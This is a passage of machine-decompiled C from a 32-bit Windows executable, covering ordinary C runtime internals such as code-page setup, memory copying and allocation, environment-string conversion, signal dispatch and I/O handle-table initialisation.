        int32_t v15; // 0x40d64d
        char v16; // 0x40d650
        char * v17; // 0x40d640
        int32_t v18; // 0x40d644
        if (v8 != 0) {
            // 0x40d623
            v12 = (char *)(v6 + (int32_t)&g125);
            v16 = v8;
            v10 = v7;
            v13 = (char *)(v10 + 1);
            v14 = *v13;
            while (v14 != 0) {
                // 0x40d62a
                v9 = v16;
                if (v9 <= v14) {
                    // 0x40d63a
                    v11 = (int32_t)v9;
                    v17 = (char *)(a2 + 25 + v11);
                    *v17 = *v17 | *v12;
                    v18 = v11 + 1;
                    while (!((v18 >= 256 | v11 >= (int32_t)*v13))) {
                        // 0x40d63a
                        v11 = v18;
                        v17 = (char *)(a2 + 25 + v11);
                        *v17 = *v17 | *v12;
                        v18 = v11 + 1;
                    }
                }
                // 0x40d64d
                v15 = v10 + 2;
                v16 = *(char *)v15;
                if (v16 == 0) {
                    // break -> 0x40d658
                    break;
                }
                v10 = v15;
                v13 = (char *)(v10 + 1);
                v14 = *v13;
            }
        }
        int32_t v19 = v6 + 1; // 0x40d658
        int32_t v20 = v7 + 8; // 0x40d662
        while (v19 != 4) {
            // 0x40d61c
            v6 = v19;
            v7 = v20;
            v8 = *(char *)v7;
            if (v8 != 0) {
                // 0x40d623
                v12 = (char *)(v6 + (int32_t)&g125);
                v16 = v8;
                v10 = v7;
                v13 = (char *)(v10 + 1);
                v14 = *v13;
                while (v14 != 0) {
                    // 0x40d62a
                    v9 = v16;
                    if (v9 <= v14) {
                        // 0x40d63a
                        v11 = (int32_t)v9;
                        v17 = (char *)(a2 + 25 + v11);
                        *v17 = *v17 | *v12;
                        v18 = v11 + 1;
                        while (!((v18 >= 256 | v11 >= (int32_t)*v13))) {
                            // 0x40d63a
                            v11 = v18;
                            v17 = (char *)(a2 + 25 + v11);
                            *v17 = *v17 | *v12;
                            v18 = v11 + 1;
                        }
                    }
                    // 0x40d64d
                    v15 = v10 + 2;
                    v16 = *(char *)v15;
                    if (v16 == 0) {
                        // break -> 0x40d658
                        break;
                    }
                    v10 = v15;
                    v13 = (char *)(v10 + 1);
                    v14 = *v13;
                }
            }
            // 0x40d658
            v19 = v6 + 1;
            v20 = v7 + 8;
        }
        // 0x40d664
        *(int32_t *)(a2 + 4) = CodePage;
        *(int32_t *)(a2 + 8) = 1;
        *(int32_t *)(a2 + 540) = function_40d05b(CodePage);
        int32_t v21 = a2 + 12; // 0x40d68b
        int32_t v22 = v3 + (int32_t)&g127; // 0x40d68b
        *(int16_t *)v21 = *(int16_t *)v22;
        int32_t v23 = 5; // 0x40d698
        v21 += 2;
        v22 += 2;
        int32_t v24 = v23; // 0x40d69b
        while (v23 != 0) {
            // 0x40d68c
            *(int16_t *)v21 = *(int16_t *)v22;
            v23 = v24 - 1;
            v21 += 2;
            v22 += 2;
            v24 = v23;
        }
        // 0x40d69d
        *(int32_t *)((int32_t)&v1 - 4) = a2;
        function_40d171((int32_t)&g266);
        // 0x40d6a7
        return function_406b2c();
    }
    int32_t v25 = 0;
    int32_t v26 = v25 + 48; // 0x40d511
    while (v26 < 240) {
        // 0x40d504
        v2++;
        if (*(int32_t *)(v25 + (int32_t)&g126 + 48) == CodePage) {
            // 0x40d504
            v3 = 48 * v2;
            goto lab_0x40d5fa;
        }
        v25 = v26;
        v26 = v25 + 48;
    }
    if ((CodePage || 1) == 0xfde9 || !IsValidCodePage(CodePage & 0xffff)) {
        // 0x40d6a7
        return function_406b2c();
    }
    // 0x40d548
    v4 = CodePage;
    int32_t lpCPInfo; // bp-28, 0x40d4c6
    if (!GetCPInfo(CodePage, (struct _cpinfo *)&lpCPInfo)) {
        // 0x40d5df
        if (g219 != 0) {
            // 0x40d5e7
            function_40d10c(a2);
        }
        // 0x40d6a7
        return function_406b2c();
    }
    // 0x40d55b
    function_407730(a2 + 24, 0, 257);
    int32_t * v27 = (int32_t *)(a2 + 4); // 0x40d56a
    *v27 = CodePage;
    int32_t * v28 = (int32_t *)(a2 + 540); // 0x40d572
    *v28 = 0;
    if (lpCPInfo < 2) {
        // 0x40d5cf
        *(int32_t *)(a2 + 8) = 0;
    } else {
        char v29; // 0x40d4c6
        if (v29 != 0) {
            // 0x40d587
            char v30; // bp-22, 0x40d4c6
            int32_t v31 = &v30; // 0x40d5a0
            unsigned char v32 = *(char *)(v31 + 1); // 0x40d587
            while (v32 != 0) {
                unsigned char v33 = *(char *)v31; // 0x40d591
                if (v33 <= v32) {
                    int32_t v34 = v33;
                    char * v35 = (char *)(a2 + 25 + v34); // 0x40d596
                    *v35 = *v35 | 4;
                    int32_t v36 = v34 + 1; // 0x40d59e
                    while (v34 != (int32_t)v32) {
                        // 0x40d596
                        v34 = v36;
                        v35 = (char *)(a2 + 25 + v34);
                        *v35 = *v35 | 4;
                        v36 = v34 + 1;
                    }
                }
                // 0x40d5a0
                v31 += 2;
                if (*(char *)v31 == 0) {
                    // break -> 0x40d5a8
                    break;
                }
                v32 = *(char *)(v31 + 1);
            }
        }
        int32_t v37 = a2 + 26; // 0x40d5ab
        int32_t v38 = 254; // 0x40d5ab
        char * v39 = (char *)v37; // 0x40d5b0
        *v39 = *v39 | 8;
        v38--;
        v37++;
        while (v38 != 0) {
            // 0x40d5b0
            v39 = (char *)v37;
            *v39 = *v39 | 8;
            v38--;
            v37++;
        }
        // 0x40d5b9
        *v28 = function_40d05b(*v27);
        *(int32_t *)(a2 + 8) = 1;
    }
    int32_t v40 = a2 + 12; // 0x40d5d4
    *(int32_t *)v40 = 0;
    bool v41; // 0x40d4c6
    int32_t v42 = v41 ? -4 : 4; // 0x40d5d7
    int32_t v43 = v42 + v40; // 0x40d5d7
    *(int32_t *)v43 = 0;
    *(int32_t *)(v43 + v42) = 0;
    // 0x40d69d
    *(int32_t *)((int32_t)&v4 - 4) = a2;
    function_40d171((int32_t)&g266);
    // 0x40d6a7
    return function_406b2c();
}

// Address range: 0x40d6b7 - 0x40d738
int32_t function_40d6b7(int32_t * a1, uint32_t a2, int32_t a3, uint32_t a4) {
    // 0x40d6b7
    if (a4 == 0) {
        // 0x40d735
        return 0;
    }
    if (a1 == NULL) {
        // 0x40d6cf
        *(int32_t *)function_40b091() = 22;
        // 0x40d735
        return 22;
    }
    int32_t v1 = (int32_t)a1;
    if (a3 != 0 && a2 >= a4) {
        // 0x40d6ef
        function_4093e0(v1, a3, a4);
        // 0x40d735
        return 0;
    }
    // 0x40d6fe
    function_407730(v1, 0, a2);
    int32_t v2; // 0x40d6b7
    int32_t result; // 0x40d6b7
    if (a3 != 0) {
        // 0x40d719
        if (a2 >= a4) {
            // 0x40d735
            return 22;
        }
        // 0x40d71e
        v2 = function_40b091();
        result = 34;
    } else {
        // 0x40d710
        v2 = function_40b091();
        result = 22;
    }
    // 0x40d725
    *(int32_t *)v2 = result;
    // 0x40d735
    return result;
}

// Address range: 0x40d738 - 0x40d791
int32_t function_40d738(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x40d738
    int32_t v1; // 0x40d738
    function_409954(a1, v1);
    int32_t v2 = a2 & 255; // 0x40d74c
    int32_t result; // 0x40d738
    int32_t v3; // 0x40d738
    if ((*(char *)(v2 + 25 + v3) & (char)a4) != 0) {
        // 0x40d777
        result = 1;
        goto lab_0x40d77a;
    } else {
        // 0x40d75c
        result = 0;
        if (a3 == 0) {
            goto lab_0x40d77a;
        } else {
            // 0x40d763
            result = 0;
            int32_t v4; // 0x40d738
            if (((int32_t)*(int16_t *)(*(int32_t *)v4 + 2 * v2) & a3) == 0) {
                goto lab_0x40d77a;
            } else {
                // 0x40d777
                result = 1;
                goto lab_0x40d77a;
            }
        }
    }
  lab_0x40d77a:;
    // 0x40d77a
    char v5; // 0x40d738
    if (v5 != 0) {
        // 0x40d781
        int32_t v6; // 0x40d738
        int32_t * v7 = (int32_t *)(v6 + 848); // 0x40d784
        *v7 = *v7 & -3;
    }
    // 0x40d78b
    return result;
}

// Address range: 0x40d791 - 0x40d7a9
int32_t function_40d791(int32_t a1) {
    // 0x40d791
    int32_t v1; // 0x40d791
    return function_40d738(0, a1, 0, 4, v1);
}

// Address range: 0x40d7a9 - 0x40d7c2
int32_t function_40d7a9(void) {
    // 0x40d7a9
    g224 = GetCommandLineA();
    int32_t v1 = (int32_t)GetCommandLineW(); // 0x40d7b4
    g225 = v1;
    return v1 & -256 | 1;
}

// Address range: 0x40d7c2 - 0x40d7f9
int32_t function_40d7c2(int32_t a1) {
    // 0x40d7c2
    if (*(int16_t *)a1 == 0) {
        // 0x40d7f3
        return a1 + 2;
    }
    int32_t v1 = a1;
    int32_t v2 = v1;
    int32_t v3 = v2 + 2; // 0x40d7db
    while (*(int16_t *)v2 != 0) {
        // 0x40d7d8
        v2 = v3;
        v3 = v2 + 2;
    }
    int32_t v4 = v1 + 2 + (-2 - v1 + v3 & -2); // 0x40d7ea
    while (*(int16_t *)v4 != 0) {
        // 0x40d7d3
        v1 = v4;
        v2 = v1;
        v3 = v2 + 2;
        while (*(int16_t *)v2 != 0) {
            // 0x40d7d8
            v2 = v3;
            v3 = v2 + 2;
        }
        // 0x40d7e3
        v4 = v1 + 2 + (-2 - v1 + v3 & -2);
    }
    // 0x40d7f3
    return v4 + 2;
}

// Address range: 0x40d7f9 - 0x40d87c
int32_t function_40d7f9(void) {
    int16_t * lpWideCharStr = GetEnvironmentStringsW(); // 0x40d802
    if (lpWideCharStr == NULL) {
        // 0x40d873
        return 0;
    }
    int32_t v1 = (int32_t)lpWideCharStr; // 0x40d802
    int32_t cchWideChar = (function_40d7c2(v1) - v1) / 2; // 0x40d81f
    int32_t v2 = 0; // bp-52, 0x40d824
    int32_t v3 = &v2; // 0x40d824
    int32_t cbMultiByte = WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar, NULL, 0, NULL, NULL); // 0x40d825
    int32_t * v4; // 0x40d7f9
    int32_t v5; // 0x40d7f9
    int32_t result; // 0x40d7f9
    int32_t v6; // 0x40d7f9
    int32_t lpMultiByteStr; // 0x40d833
    int32_t v7; // 0x40d84a
    if (cbMultiByte == 0) {
        // 0x40d810
        v4 = (int32_t *)(v3 - 4);
        result = 0;
        goto lab_0x40d86c;
    } else {
        // 0x40d832
        lpMultiByteStr = function_40c196(cbMultiByte);
        v7 = v3;
        if (lpMultiByteStr == 0) {
            goto lab_0x40d85b;
        } else {
            int32_t v8 = 0; // bp-84, 0x40d84a
            v7 = &v8;
            int32_t v9 = WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar, (char *)lpMultiByteStr, cbMultiByte, NULL, NULL); // 0x40d84b
            v5 = lpMultiByteStr;
            v6 = 0;
            if (v9 == 0) {
                goto lab_0x40d85b;
            } else {
                goto lab_0x40d85d;
            }
        }
    }
  lab_0x40d86c:
    // 0x40d86c
    *v4 = v1;
    FreeEnvironmentStringsW((int16_t *)&g266);
    // 0x40d873
    return result;
  lab_0x40d85b:
    // 0x40d85b
    v5 = 0;
    v6 = lpMultiByteStr;
    goto lab_0x40d85d;
  lab_0x40d85d:;
    int32_t * v10 = (int32_t *)(v7 - 4);
    *v10 = v6;
    function_40c15c((int32_t)&g266);
    v4 = v10;
    result = v5;
    goto lab_0x40d86c;
}

// Address range: 0x40d87c - 0x40d8f4
int32_t function_40d87c(int32_t a1, uint32_t a2, uint32_t a3) {
    // 0x40d87c
    if (a2 != 0) {
        if (0xffffffe0 / a2 < a3) {
            // 0x40d8a0
            *(int32_t *)function_40b091() = 12;
            // 0x40d8f1
            return 0;
        }
    }
    int32_t v1 = 0; // 0x40d8b6
    if (a1 != 0) {
        // 0x40d8b8
        int32_t v2; // 0x40d87c
        int32_t v3; // 0x40d87c
        int32_t v4; // 0x40d87c
        int32_t v5; // 0x40d87c
        v1 = function_40f853(a1, v2, v5, v3, v4);
    }
    uint32_t v6 = v1;
    uint32_t v7 = a3 * a2; // 0x40d8c5
    int32_t result = function_40f886(a1, v7); // 0x40d8cb
    if (result != 0 && v7 > v6) {
        // 0x40d8dc
        function_407730(result + v6, 0, v7 - v6);
    }
    // 0x40d8f1
    return result;
}

// Address range: 0x40d8f4 - 0x40d905
int32_t function_40d8f4(void) {
    int32_t * v1 = GetProcessHeap(); // 0x40d8f4
    int32_t v2 = (int32_t)v1; // 0x40d8f4
    g227 = v2;
    return v2 & -256 | (int32_t)(v1 != NULL);
}

// Address range: 0x40d905 - 0x40d90f
int32_t function_40d905(void) {
    // 0x40d905
    g227 = 0;
    int32_t v1; // 0x40d905
    return v1 & -256 | 1;
}

// Address range: 0x40d90f - 0x40d992
int32_t function_40d90f(int32_t * a1, int32_t * a2) {
    if (a1 == a2) {
        // 0x40d983
        return function_406b2c();
    }
    int32_t v1 = (int32_t)a2;
    int32_t v2 = (int32_t)a1;
    if (*(int32_t *)v2 != 0) {
        // 0x40d936
        if ((char)function_406b3d() == 0) {
            // break -> 0x40d94c
            break;
        }
    }
    int32_t v3 = v2 + 8; // 0x40d944
    int32_t v4 = v3; // 0x40d94a
    while (v3 != v1) {
        int32_t v5 = v3;
        if (*(int32_t *)v5 != 0) {
            // 0x40d936
            v4 = v5;
            if ((char)function_406b3d() == 0) {
                // break -> 0x40d94c
                break;
            }
        }
        // 0x40d944
        v3 = v5 + 8;
        v4 = v3;
    }
    int32_t v6 = v4;
    if (v6 == v1 || v6 == v2) {
        // 0x40d983
        return function_406b2c();
    }
    int32_t v7 = v6 - 4;
    int32_t v8 = v7 - 4; // 0x40d95c
    int32_t v9; // bp-20, 0x40d90f
    if (*(int32_t *)v8 != 0) {
        // 0x40d962
        if (*(int32_t *)v7 != 0) {
            // 0x40d968
            *(int32_t *)((int32_t)&v9 - 4) = 0;
            function_406b3d();
        }
    }
    int32_t v10 = v7 - 8; // 0x40d97d
    while (v8 != v2) {
        // 0x40d95c
        v7 = v10;
        v8 = v7 - 4;
        if (*(int32_t *)v8 != 0) {
            // 0x40d962
            if (*(int32_t *)v7 != 0) {
                // 0x40d968
                *(int32_t *)((int32_t)&v9 - 4) = 0;
                function_406b3d();
            }
        }
        // 0x40d975
        v10 = v7 - 8;
    }
    // 0x40d983
    return function_406b2c();
}

// Address range: 0x40d992 - 0x40d9df
int32_t function_40d992(int32_t * a1, int32_t * a2) {
    if (a1 == a2) {
        // 0x40d9ce
        return function_406b2c();
    }
    int32_t v1 = (int32_t)a2 - 4; // 0x40d9ae
    int32_t v2; // bp-16, 0x40d992
    if (*(int32_t *)v1 != 0) {
        // 0x40d9b5
        *(int32_t *)((int32_t)&v2 - 4) = 0;
        function_406b3d();
    }
    while (v1 - 4 != (int32_t)a1) {
        // 0x40d9c2
        v1 -= 8;
        if (*(int32_t *)v1 != 0) {
            // 0x40d9b5
            *(int32_t *)((int32_t)&v2 - 4) = 0;
            function_406b3d();
        }
    }
    // 0x40d9ce
    return function_406b2c();
}

// Address range: 0x40d9df - 0x40da2a
int32_t function_40d9df(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40d9df
    function_406cf0(&g103, 12, (int32_t)&g266);
    int32_t v1; // 0x40d9df
    int32_t * v2 = (int32_t *)(v1 - 28); // 0x40d9eb
    *v2 = 0;
    function_40c527(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v3 = (int32_t *)(v1 - 4); // 0x40d9fa
    *v3 = 0;
    uint32_t v4 = g112 & 31; // 0x40da06
    int32_t v5 = g230 ^ g112; // 0x40da09
    int32_t v6 = v5; // 0x40da0f
    if (v4 != 0) {
        v6 = v5 >> v4 | v5 << 32 - v4;
    }
    *v2 = v6;
    *v3 = -2;
    function_40da2d();
    int32_t result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40da22
    return result;
}

// Address range: 0x40da2d - 0x40da39
int32_t function_40da2d(void) {
    // 0x40da2d
    int32_t v1; // 0x40da2d
    return function_40c56f(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40da39 - 0x40da61
int32_t function_40da39(int32_t a1, int32_t * a2, int32_t a3, int32_t a4) {
    int32_t v1 = a1; // bp-12, 0x40da47
    int32_t v2 = a1; // bp-16, 0x40da4a
    int32_t v3; // 0x40da39
    return function_40d9df(&v2, (int32_t)a2, &v1, a1, a1, v3);
}

// Address range: 0x40da61 - 0x40daa3
int32_t function_40da61(int32_t a1) {
    int32_t result = &g228; // 0x40da61
    switch (a1) {
        case 6: {
        }
        case 22: {
            // 0x40da87
            result = &g230;
        }
        case 2: {
            // 0x40da83
            return result;
        }
        case 15: {
            // 0x40da83
            result = &g231;
            return result;
        }
        case 21: {
            // 0x40da83
            result = &g229;
            return result;
        }
        default: {
            // 0x40da83
            result = 0;
            return result;
        }
    }
}

// Address range: 0x40daa3 - 0x40dacb
int32_t function_40daa3(int32_t a1, int32_t a2) {
    int32_t v1 = a2;
    int32_t result = v1; // 0x40dabe
    while (*(int32_t *)(v1 + 4) != a1) {
        // 0x40dac0
        result = 0;
        if (v1 == a2 + 132) {
            // break -> 0x40dac9
            break;
        }
        v1 += 12;
        result = v1;
    }
    // 0x40dac9
    return result;
}

// Address range: 0x40dacb - 0x40dae2
int32_t function_40dacb(void) {
    // 0x40dacb
    int32_t v1; // bp-5, 0x40dacb
    int32_t v2; // 0x40dacb
    int32_t v3; // 0x40dacb
    return function_40da39(3, &v1, v3, v2);
}

// Address range: 0x40dae2 - 0x40db1d
int32_t function_40dae2(int32_t a1) {
    // 0x40dae2
    function_4099f8(a1);
    function_4099f8(a1);
    function_4099f8(a1);
    return function_4099f8(a1);
}

// Address range: 0x40db1d - 0x40db26
int32_t function_40db1d(void) {
    // 0x40db1d
    return function_40bfb3() + 8;
}

// Address range: 0x40db26 - 0x40dd2e
int32_t function_40db26(int32_t a1) {
    int32_t v1 = &g102; // bp-8, 0x40db28
    function_411940(&g102, 44, (int32_t)&g266);
    int32_t v2; // 0x40db26
    int32_t * v3 = (int32_t *)(v2 - 44); // 0x40db34
    *v3 = 0;
    int32_t * v4 = (int32_t *)(v2 - 52); // 0x40db37
    *v4 = 0;
    char * v5 = (char *)(v2 - 29); // 0x40db3c
    *v5 = 1;
    int32_t v6 = *(int32_t *)(v2 + 8); // 0x40db3f
    if (v6 > 8) {
        switch (v6) {
            case 11: {
                goto lab_0x40db80;
            }
            case 15: {
                goto lab_0x40dbd0;
            }
            default: {
                if (v6 > 22) {
                    int32_t v7 = function_40b091(); // 0x40dbab
                }
                goto lab_0x40dbd0;
            }
        }
    } else {
        switch (v6) {
            case 8: {
                goto lab_0x40db80;
            }
            case 2: {
                goto lab_0x40dbd0;
            }
            default: {
                int32_t v8 = v6 - 4; // 0x40db54
                if (v8 == 0) {
                    goto lab_0x40db80;
                } else {
                    if (v8 != 2) {
                        // 0x40dbab
                        *(int32_t *)function_40b091() = 22;
                        // 0x40dd28
                        return function_411989();
                    }
                    goto lab_0x40dbd0;
                }
            }
        }
    }
  lab_0x40db80:;
    int32_t v9 = function_40c037(); // 0x40db80
    *v3 = v9;
    if (v9 == 0) {
        // 0x40dd28
        return function_411989();
    }
    int32_t v10 = function_40daa3(v6, *(int32_t *)v9); // 0x40db99
    if (v10 == 0) {
        // 0x40dbab
        *(int32_t *)function_40b091() = 22;
        // 0x40dd28
        return function_411989();
    }
    // 0x40dbc5
    *v5 = 0;
    int32_t * v11 = (int32_t *)(v2 - 40); // 0x40dbc5
    *v11 = v10 + 8;
    int32_t * v12 = (int32_t *)(v2 - 48); // 0x40dbc8
    *v12 = 0;
    int32_t * v13 = v12; // 0x40db26
    int32_t * v14 = v11; // 0x40db26
    int32_t v15 = v9; // 0x40db26
    bool v16 = true; // 0x40db26
    goto lab_0x40dbdb;
  lab_0x40dbd0:;
    int32_t v34 = function_40da61(v6); // 0x40db76
    int32_t * v35 = (int32_t *)(v2 - 40); // 0x40dbc5
    *v35 = v34;
    int32_t * v36 = (int32_t *)(v2 - 48); // 0x40dbc8
    *v36 = 0;
    function_40c527(3);
    v13 = v36;
    v14 = v35;
    v15 = 0;
    v16 = *v5 == 0;
    goto lab_0x40dbdb;
  lab_0x40dbdb:;
    int32_t * v17 = (int32_t *)(v2 - 36); // 0x40dbdb
    *v17 = 0;
    char * v18 = (char *)(v2 - 30); // 0x40dbdf
    *v18 = 0;
    int32_t * v19 = (int32_t *)(v2 - 4); // 0x40dbe3
    *v19 = 0;
    int32_t v20 = *v14; // 0x40dbe7
    char v21; // 0x40db26
    int32_t v22; // 0x40db26
    if (v16) {
        // 0x40dc02
        v21 = 0;
        v22 = *(int32_t *)v20;
    } else {
        uint32_t v23 = g112 & 31; // 0x40dbf6
        int32_t v24 = *(int32_t *)v20 ^ g112; // 0x40dbf9
        int32_t v25 = v24; // 0x40dbfb
        if (v23 != 0) {
            v25 = v24 >> v23 | v24 << 32 - v23;
        }
        v21 = *v5;
        v22 = v25;
    }
    int32_t v26 = &v1;
    *v17 = v22;
    int32_t v27 = v2 - 56; // 0x40dc11
    *(int32_t *)v27 = (int32_t)(v22 == 1);
    *v18 = (char)(v22 == 1);
    if (v22 == 1) {
        goto lab_0x40dca9;
    } else {
        if (v22 == 0) {
            if (v21 != 0) {
                // 0x40dc27
                function_40c56f(3);
            }
            // 0x40dc2f
            *(int32_t *)(v26 - 4) = 3;
            function_40a0e2((int32_t)&g266);
            // UNREACHABLE
        }
        switch (v6) {
            case 11: {
                goto lab_0x40dc44;
            }
            case 8: {
                goto lab_0x40dc44;
            }
            default: {
                if (v6 != 4) {
                    goto lab_0x40dc67;
                } else {
                    goto lab_0x40dc44;
                }
            }
        }
    }
  lab_0x40dca9:
    // 0x40dca9
    *v19 = -2;
    function_40dce6();
    if (*(char *)v27 != 0) {
        function_40dd26();
    }
    if (v6 != 8) {
        function_40dcf5();
    }
    // 0x40dcbf
    *(int32_t *)(v26 - 4) = *(int32_t *)(function_40bfb3() + 8);
    *(int32_t *)(v26 - 8) = 8;
    function_406b3d();
    return function_40dd02((int32_t)&g266);
  lab_0x40dc44:;
    int32_t * v28 = (int32_t *)(v15 + 4); // 0x40dc44
    *v13 = *v28;
    *v28 = 0;
    if (v6 != 8) {
        goto lab_0x40dc8d;
    } else {
        // 0x40dc52
        *v4 = *(int32_t *)function_40db1d();
        *(int32_t *)function_40db1d() = 140;
        goto lab_0x40dc67;
    }
  lab_0x40dc67:
    if (v6 != 8) {
        goto lab_0x40dc8d;
    } else {
        int32_t v29 = *(int32_t *)v15; // 0x40dc72
        int32_t v30 = v29 + 36; // 0x40dc72
        int32_t * v31 = (int32_t *)(v2 - 60); // 0x40dc7d
        *v31 = v30;
        int32_t v32 = v30;
        *(int32_t *)(v32 + 8) = 0;
        int32_t v33 = v32 + 12; // 0x40dc88
        *v31 = v33;
        while (v32 != v29 + 132) {
            // 0x40dc84
            v32 = v33;
            *(int32_t *)(v32 + 8) = 0;
            v33 = v32 + 12;
            *v31 = v33;
        }
        goto lab_0x40dca9;
    }
  lab_0x40dc8d:
    // 0x40dc8d
    *(int32_t *)*v14 = g112;
    goto lab_0x40dca9;
}

// Address range: 0x40dce6 - 0x40dcf5
int32_t function_40dce6(void) {
    // 0x40dce6
    int32_t result; // 0x40dce6
    int32_t v1; // 0x40dce6
    if (*(char *)(v1 - 29) != 0) {
        // 0x40dcec
        result = function_40c56f(3);
    }
    // 0x40dcf4
    return result;
}

// Address range: 0x40dcf5 - 0x40dd02
int32_t function_40dcf5(void) {
    // 0x40dcf5
    return function_406b3d();
}

// Address range: 0x40dd02 - 0x40dd26
int32_t function_40dd02(int32_t a1) {
    // 0x40dd02
    int32_t v1; // 0x40dd02
    int32_t v2; // 0x40dd02
    if (v2 != 4 == (v2 != v1 && v2 != 11)) {
        function_40dd26();
    }
    // 0x40dd11
    int32_t v3; // 0x40dd02
    int32_t v4; // 0x40dd02
    *(int32_t *)(v4 + 4) = *(int32_t *)(v3 - 48);
    if (v2 != v1) {
        function_40dd26();
    }
    int32_t result = function_40bfb3(); // 0x40dd1b
    *(int32_t *)(result + 8) = *(int32_t *)(v3 - 52);
    return result;
}

// Address range: 0x40dd26 - 0x40dd28
int32_t function_40dd26(void) {
    // 0x40dd26
    return 0;
}

// Address range: 0x40dd2e - 0x40dda8
int32_t function_40dd2e(void) {
    int32_t v1 = 48; // bp-24, 0x40dd37
    int32_t result = function_40ca21(64, 48); // 0x40dd3b
    if (result == 0) {
        // 0x40dd99
        int32_t v2; // bp-20, 0x40dd2e
        *(int32_t *)((int32_t)&v2 - 4) = 0;
        function_40c15c((int32_t)&g266);
        return 0;
    }
    int32_t v3 = &v1; // 0x40dd5f
    int32_t v4 = result + 32;
    *(int32_t *)(v3 - 4) = 0;
    int32_t v5 = v3 - 8; // 0x40dd62
    *(int32_t *)v5 = 4000;
    v3 -= 12;
    *(int32_t *)v3 = v4 - 32;
    function_40c7f8((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    *(int32_t *)(v4 - 8) = -1;
    *(int32_t *)v4 = 0;
    *(int32_t *)(v4 + 4) = 0;
    *(int32_t *)(v4 + 8) = 0xa0a0000;
    *(char *)(v4 + 12) = 10;
    char * v6 = (char *)(v4 + 13); // 0x40dd8a
    *v6 = *v6 & -8;
    *(char *)(v4 + 14) = 0;
    int32_t v7 = v4 + 48; // 0x40dd93
    while (v4 != result + 3056) {
        // 0x40dd61
        v4 = v7;
        *(int32_t *)(v3 - 4) = 0;
        v5 = v3 - 8;
        *(int32_t *)v5 = 4000;
        v3 -= 12;
        *(int32_t *)v3 = v4 - 32;
        function_40c7f8((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        *(int32_t *)(v4 - 8) = -1;
        *(int32_t *)v4 = 0;
        *(int32_t *)(v4 + 4) = 0;
        *(int32_t *)(v4 + 8) = 0xa0a0000;
        *(char *)(v4 + 12) = 10;
        v6 = (char *)(v4 + 13);
        *v6 = *v6 & -8;
        *(char *)(v4 + 14) = 0;
        v7 = v4 + 48;
    }
    // 0x40dd99
    *(int32_t *)(v5 - 4) = 0;
    function_40c15c((int32_t)&g266);
    return result;
}

// Address range: 0x40dda8 - 0x40dddd
int32_t function_40dda8(int32_t a1) {
    if (a1 == 0) {
        // 0x40ddda
        int32_t result; // 0x40dda8
        return result;
    }
    int32_t v1 = a1;
    int32_t v2; // bp-16, 0x40dda8
    int32_t v3 = &v2;
    int32_t v4 = v3 - 4; // 0x40ddc3
    *(int32_t *)v4 = v1;
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
    while (v1 != a1 + 3024) {
        // 0x40ddc3
        v1 += 48;
        v3 = v4;
        v4 = v3 - 4;
        *(int32_t *)v4 = v1;
        DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
    }
    // 0x40ddd1
    *(int32_t *)(v3 - 8) = a1;
    // 0x40ddda
    return function_40c15c((int32_t)&g266);
}

// Address range: 0x40dddd - 0x40de69
int32_t function_40dddd(int32_t a1) {
    // 0x40dddd
    function_406cf0(&g104, 20, (int32_t)&g266);
    int32_t v1; // 0x40dddd
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x40dde9
    int32_t result; // 0x40de07
    if (*v2 >= 0x2000) {
        // 0x40ddf6
        *(int32_t *)function_40b091() = 9;
        // 0x40de05
        result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t * v3 = (int32_t *)(v1 - 28); // 0x40de0f
    *v3 = 0;
    function_40c527(7);
    int32_t * v4 = (int32_t *)(v1 - 4); // 0x40de1a
    *v4 = 0;
    int32_t * v5 = (int32_t *)(v1 - 32); // 0x40de24
    *v5 = 0;
    int32_t v6 = 0; // 0x40de2a
    if (*v2 >= g209) {
        int32_t * v7 = (int32_t *)(4 * v6 + (int32_t)&g207); // 0x40de2c
        int32_t v8 = g209; // 0x40de33
        int32_t v9; // 0x40de35
        if (*v7 == 0) {
            // 0x40de35
            v9 = function_40dd2e();
            *v7 = v9;
            if (v9 == 0) {
                // 0x40de45
                *v3 = 12;
                goto lab_0x40de4b;
            }
            // 0x40de59
            v8 = g209 + 64;
            g209 = v8;
        }
        int32_t v10 = v8;
        v6++;
        *v5 = v6;
        while (*v2 >= v10) {
            // 0x40de2c
            v7 = (int32_t *)(4 * v6 + (int32_t)&g207);
            v8 = v10;
            if (*v7 == 0) {
                // 0x40de35
                v9 = function_40dd2e();
                *v7 = v9;
                if (v9 == 0) {
                    // 0x40de45
                    *v3 = 12;
                    goto lab_0x40de4b;
                }
                // 0x40de59
                v8 = g209 + 64;
                g209 = v8;
            }
            // 0x40de66
            v10 = v8;
            v6++;
            *v5 = v6;
        }
    }
  lab_0x40de4b:
    // 0x40de4b
    *v4 = -2;
    function_40de6c();
    // 0x40de05
    result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x40de6c - 0x40de75
int32_t function_40de6c(void) {
    // 0x40de6c
    return function_40c56f(7);
}

// Address range: 0x40de75 - 0x40de98
int32_t function_40de75(int32_t a1) {
    int32_t v1 = *(int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40de88
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)(v1 + 48 * (a1 & 63)));
    return &g266;
}

// Address range: 0x40de98 - 0x40debb
int32_t function_40de98(int32_t a1) {
    int32_t v1 = *(int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40deab
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)(v1 + 48 * (a1 & 63)));
    return &g266;
}

// Address range: 0x40debb - 0x40df4c
int32_t function_40debb(uint32_t a1) {
    // 0x40debb
    if (a1 >= 0) {
        // 0x40deca
        if ((uint32_t)g209 > a1) {
            int32_t v1 = 48 * (a1 & 63);
